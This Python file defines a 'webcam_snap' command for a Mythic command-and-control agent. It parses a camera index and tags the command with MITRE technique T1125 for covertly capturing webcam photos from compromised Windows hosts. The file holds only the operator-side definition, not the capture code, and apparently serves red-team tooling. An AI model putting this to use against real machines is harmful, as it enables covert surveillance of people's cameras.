from mythic_container.MythicCommandBase import *


class WebcamSnapArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="device_index",
                cli_name="device_index",
                display_name="Camera Device Index",
                type=ParameterType.Number,
                default_value=0,
                description="Index of the camera device to capture from (0 = first camera). Use webcam_list to see available devices.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=1
                    )
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            self.add_arg("device_index", 0)
        elif self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            try:
                idx = int(self.command_line.strip())
                self.add_arg("device_index", idx)
            except:
                raise Exception("Invalid device index: {}".format(self.command_line))


class WebcamSnapCommand(CommandBase):
    cmd = "webcam_snap"
    needs_admin = False
    help_cmd = "webcam_snap [device_index]"
    description = "Capture a single photo from a webcam device and download it. Similar to Cobalt Strike's webcam_snap and Meterpreter's webcam_snap."
    version = 1
    author = "@haha150"
    argument_class = WebcamSnapArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1125"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        device_index = taskData.args.get_arg("device_index")
        response.DisplayParams = "-DeviceIndex {}".format(device_index)
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
